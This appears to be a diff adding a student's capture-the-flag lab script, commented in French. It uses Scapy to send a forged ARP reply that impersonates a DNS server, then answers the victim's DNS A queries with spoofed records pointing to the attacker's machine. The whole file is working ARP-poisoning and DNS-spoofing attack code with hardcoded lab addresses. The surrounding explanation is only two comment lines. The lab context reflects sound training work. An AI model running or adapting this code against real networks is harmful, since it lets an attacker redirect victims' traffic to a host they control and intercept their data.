@@ -1,0 +1,52 @@
+#scriptC du tp1
+#script de dns que j'ai run pour trouver le hostname et aussi pour le flag
+
+from scapy.all import *
+
+packet1 = Ether(dst="a6:06:e3:ab:63:a1")/ARP(op=2, psrc="192.168.1.222", hwdst="a6:06:e3:ab:63:a1", pdst="192.168.1.102")
+sendp(packet1)
+
+
+TARGET_IP = "192.168.1.102"
+TARGET_MAC = "a6:06:e3:ab:63:a1"
+
+FAKE_DNS_IP = "192.168.1.222"
+MY_MAC = "e6:7b:8d:5a:5f:fb"
+
+VM_IP = "192.168.1.3"
+
+def dns_response(packet):
+    if not packet.haslayer(DNS):
+        return
+
+    if packet[DNS].qr != 0:
+        return
+
+    if packet[IP].src != TARGET_IP:
+        return
+
+    if packet[UDP].dport != 53:
+        return
+
+    dns = packet[DNS]
+    question = dns.qd
+
+    qname = question.qname.decode()
+    # print(f"[DNS] .102 veut : {qname}") donne le hostname
+    qtype = question.qtype
+	
+    if qtype == 1:
+        response = (
+            Ether(src=MY_MAC, dst=TARGET_MAC)
+            / IP(src=FAKE_DNS_IP, dst=TARGET_IP)
+            / UDP(sport=53, dport=packet[UDP].sport)
+            / DNS(
+                id=dns.id,
+                qr=1,
+                qd=question,
+                an=DNSRR(rrname=qname, type="A", rclass="IN", rdata=VM_IP),
+            )
+        )
+        sendp(response)
+
+sniff(prn=dns_response)
